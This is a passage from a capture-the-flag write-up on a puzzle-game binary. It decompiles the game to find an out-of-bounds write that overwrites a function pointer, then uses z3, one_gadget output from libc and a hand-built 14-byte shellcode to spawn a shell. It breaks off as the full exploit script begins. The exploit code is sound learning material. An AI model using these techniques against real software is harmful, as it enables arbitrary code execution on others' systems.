</span></span><span class="line"><span class="cl">    <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">read_input</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">lVar3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">lVar3</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">lVar3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Increment how much? &gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">read_input</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">local_34</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">-</span><span class="n">lVar3</span> <span class="o">+</span> <span class="mi">7</span><span class="p">;</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_34</span> <span class="o">&lt;=</span> <span class="o">-</span><span class="n">lVar3</span> <span class="o">+</span> <span class="mi">9</span><span class="p">;</span> <span class="n">local_34</span> <span class="o">=</span> <span class="n">local_34</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="o">*</span><span class="p">(</span><span class="kt">short</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_00104050</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_34</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">               <span class="o">*</span><span class="p">(</span><span class="kt">short</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_00104050</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_34</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="kt">short</span><span class="p">)</span><span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Congrats! You solved it!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">DAT_00104040</span> <span class="o">=</span> <span class="n">DAT_00104040</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>At first, I didn&rsquo;t see any bugs in here. But one of my teammates (Kudos to <code>daeMOn</code>) told me that there is a bug in this method. Let&rsquo;s check this LOC:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">local_34</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">-</span><span class="n">lVar3</span> <span class="o">+</span> <span class="mi">7</span><span class="p">;</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_34</span> <span class="o">&lt;=</span> <span class="o">-</span><span class="n">lVar3</span> <span class="o">+</span> <span class="mi">9</span><span class="p">;</span> <span class="n">local_34</span> <span class="o">=</span> <span class="n">local_34</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="o">*</span><span class="p">(</span><span class="kt">short</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_00104050</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_34</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">               <span class="o">*</span><span class="p">(</span><span class="kt">short</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_00104050</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_34</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="kt">short</span><span class="p">)</span><span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is an out-of-bound bug (OOB) due to an improper check. Notice that <code>lVar3</code> is our index input, and if we input <code>1</code> or <code>8</code> as the index, it will modify <code>DAT_00104050+(8*2)</code> and <code>DAT_00104050-(1*2)</code> also. The size of the board is only 16 bytes, yet the program allowed it to overwrite OOB memories. Let&rsquo;s check what kind of data can be overwritten due to this.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef➤  x/22gx 0x555f0e8a3040
</span></span><span class="line"><span class="cl">0x555f0e8a3040: 0x0000000000000000      0x0100000000000000
</span></span><span class="line"><span class="cl">0x555f0e8a3050: 0x106d530b1473264c      0x461931b55055da14
</span></span><span class="line"><span class="cl">0x555f0e8a3060: 0x0000555f0e8a63a2      0x0000555f0e8a65b5
</span></span><span class="line"><span class="cl">0x555f0e8a3070: 0x0000555f0e8a660b      0x0000555f0e8a66a0
</span></span><span class="line"><span class="cl">0x555f0e8a3080: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x555f0e8a3090: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x555f0e8a30a0: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x555f0e8a30b0: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x555f0e8a30c0: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x555f0e8a30d0: 0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">0x555f0e8a30e0: 0x0000000000000000      0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Well, turn out we can overwrite the last 4 bytes of the <code>menu_play</code> address by incrementing the index <code>1</code>.</p>
<h3 id="exploitation-plan-1">Exploitation Plan</h3>
<p>From our initial analysis, the important notes that we took:</p>
<ul>
<li><code>.bss</code> is RWX</li>
<li>We can freely control the board value via the increment method</li>
<li>And somehow, there is a bug in the board value&rsquo;s assignment, which allowed us to replace the last 4 bytes of the <code>menu_play</code> method.</li>
</ul>
<p>So, the idea for solving this challenge is we need to somehow control the increment so that two conditions will be fulfilled, which are:</p>
<ul>
<li>Change the board value to our desired shellcode</li>
<li>Change the stored <code>menu_play</code> pointer to the board address (Because it is RWX), so that if we call <code>menu_play</code>, it will run our desired shellcode</li>
</ul>
<p>If the above conditions are fulfilled, the next time we try to call the <code>menu_play</code>&rsquo;s method for the board&rsquo;s game, it will give us a shell instead.</p>
<h3 id="solution-1">Solution</h3>
<p>First, we need to solve the puzzle. We need to create a script to determine the correct increment on each index so that the board address will contain our desired value. How to create the script?</p>
<p>Well, just use z3 to do it xD. Luckily, during the competition, my teammate daeMOn was sharing his script to complete the z3 logic. Let&rsquo;s say that our target value is <code>1337 beef 1337 beef 1337 beef 1337 beef</code>, and the initial value is <code>beef 1337 beef 1337 beef 1337 beef 1337</code>. We can convert this to z3 equations, where:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">    <span class="c1"># Below is the total increment on each index that we want to find</span>
</span></span><span class="line"><span class="cl">    <span class="n">x1</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x1&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x2</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x2&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x3</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x3&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x4</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x4&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x5</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x5&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x6</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x6&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x7</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x7&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># Below is the initial state</span>
</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">e</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">g</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># Below is the target state that we want</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_7</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[:</span><span class="mi">2</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_6</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_5</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_4</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">8</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_3</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">10</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_2</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">12</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_1</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="ne">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">12</span><span class="p">:</span><span class="mi">14</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Below is the constraints that we pass to the z3</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Notes that below is the z3 equations that we derive from the game&#39;s rule</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">+</span> <span class="n">x1</span> <span class="o">+</span> <span class="n">x2</span> <span class="o">==</span> <span class="n">target_1</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">+</span> <span class="n">x1</span> <span class="o">+</span> <span class="n">x2</span> <span class="o">+</span> <span class="n">x3</span> <span class="o">==</span> <span class="n">target_2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">+</span> <span class="n">x2</span> <span class="o">+</span> <span class="n">x3</span> <span class="o">+</span> <span class="n">x4</span> <span class="o">==</span> <span class="n">target_3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">d</span> <span class="o">+</span> <span class="n">x3</span> <span class="o">+</span> <span class="n">x4</span> <span class="o">+</span> <span class="n">x5</span> <span class="o">==</span> <span class="n">target_4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">e</span> <span class="o">+</span> <span class="n">x4</span> <span class="o">+</span> <span class="n">x5</span> <span class="o">+</span> <span class="n">x6</span> <span class="o">==</span> <span class="n">target_5</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">+</span> <span class="n">x5</span> <span class="o">+</span> <span class="n">x6</span> <span class="o">+</span> <span class="n">x7</span> <span class="o">==</span> <span class="n">target_6</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">g</span> <span class="o">+</span> <span class="n">x6</span> <span class="o">+</span> <span class="n">x7</span> <span class="o">==</span> <span class="n">target_7</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that even though the max index is 8, we can only have 7 in the z3, which means the max desired value size is 14 bytes. The z3 couldn&rsquo;t solve the equations if we try to set the target state to 16 bytes, so we concluded that the limit is 14 bytes (where it&rsquo;s always <code>sat</code>).</p>
<p>To execute our plan, first, we will need to craft 14-bytes shellcode. The constraint is pretty short and seems impossible, but luckily during debugging with GDB, I found some good values.</p>
<p>First, I was checking the register value right after we do <code>call rdx</code> (which is calling the stored <code>main_play</code> address).</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/9jZAtL7.png"
        data-srcset="https://i.imgur.com/9jZAtL7.png, https://i.imgur.com/9jZAtL7.png 1.5x, https://i.imgur.com/9jZAtL7.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/9jZAtL7.png"
        title="https://i.imgur.com/9jZAtL7.png" /></p>
<p>Notice that:</p>
<ul>
<li><code>rbx</code> is 0</li>
<li><code>rcx</code> contains <code>libc</code> address</li>
<li><code>rdx</code> and <code>rsi</code> isn&rsquo;t zero yet</li>
</ul>
<p>We&rsquo;ve already had a <code>libc</code> address in our register for our shellcode. This will help us a lot. But first, let&rsquo;s try to find out which <code>libc</code> is used by the challenge.</p>
<p>How to get the <code>libc</code>? Because we have the <code>Dockerfile</code>, we can simply build it and take the <code>libc.so.6</code> file from <code>/usr/lib/x86_64-linux-gnu/</code>. Now, let&rsquo;s use one_gadget to the retrieved <code>libc</code>, to find the shell address and rules to be followed. Below is the result:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x50a37</span> <span class="n">posix_spawn</span><span class="p">(</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">,</span> <span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span><span class="o">+</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">environ</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">constraints</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">rsp</span> <span class="o">&amp;</span> <span class="mh">0xf</span> <span class="o">==</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">  <span class="n">rcx</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span><span class="line"><span class="cl">  <span class="n">rbp</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="p">(</span><span class="n">u16</span><span class="p">)[</span><span class="n">rbp</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mh">0xebcf1</span> <span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="n">r10</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x70</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">constraints</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">address</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x78</span> <span class="n">is</span> <span class="n">writable</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">r10</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="n">r10</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span><span class="line"><span class="cl">  <span class="p">[[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x70</span><span class="p">]]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x70</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mh">0xebcf5</span> <span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="n">r10</span><span class="p">,</span> <span class="n">rdx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">constraints</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">address</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x78</span> <span class="n">is</span> <span class="n">writable</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">r10</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="n">r10</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">rdx</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="n">rdx</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mh">0xebcf8</span> <span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rdx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">constraints</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">address</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x78</span> <span class="n">is</span> <span class="n">writable</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">rsi</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="n">rsi</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">rdx</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="n">rdx</span> <span class="o">==</span> <span class="n">NULL</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>With this, we hoped that jumping to the given gadget can be fitted into the 14-bytes space.</p>
<p>Let&rsquo;s start crafting our shellcode by incrementing/subtracting the stored <code>rcx</code> so that it points to the one_gadget&rsquo;s result. We use the third gadget (<code>0xebcf8</code>) because using <code>rsi</code> or <code>rdx</code> will decrease the shellcode&rsquo;s size.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    sub rcx, 0x28d3f
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above line will need 7 bytes, so we can only have 7 bytes more to complete the gadget call. Now we have a register with our desired jump address, we need to fulfill the constraints given by one_gadget, which are:</p>
<ul>
<li>rsi == NULL</li>
<li>rdx == NULL</li>
</ul>
<p>Checking through the gdb, the constraints weren&rsquo;t fulfilled yet. Usually, we will use <code>xor rsi, rsi</code> to nullify a register, but it needs 3 bytes to do that. We know that <code>rbx</code> is 0, we can simply use this to produce two bytes shellcode that can nullify the <code>rsi</code> and <code>rdx</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    sub rcx, 0x28d3f
</span></span><span class="line"><span class="cl">    push rbx
</span></span><span class="line"><span class="cl">    pop rsi
</span></span><span class="line"><span class="cl">    push rbx
</span></span><span class="line"><span class="cl">    pop rdx
</span></span></code></pre></td></tr></table>
</div>
</div><p>Our current shellcode size is 11 bytes, so there are only 3 bytes more that we can squeeze into the payload. Now that our constraints have been fulfilled, we only need to complete the shellcode, by adding <code>jmp rcx</code>, so that we will gain a shell. The final shellcode is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    sub rcx, 0x28d3f
</span></span><span class="line"><span class="cl">    push rbx
</span></span><span class="line"><span class="cl">    pop rsi
</span></span><span class="line"><span class="cl">    push rbx
</span></span><span class="line"><span class="cl">    pop rdx
</span></span><span class="line"><span class="cl">    jmp rcx
</span></span><span class="line"><span class="cl">    nop
</span></span></code></pre></td></tr></table>
</div>
</div><p>The total shellcode is 13 bytes, and I add extra nop just to round it to 14 bytes.</p>
<p>Now that we already have a working shellcode, now it&rsquo;s time for us to solve the puzzle so that the <code>.bss</code> sections will contain our shellcode.</p>
<p>Below is the full script</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
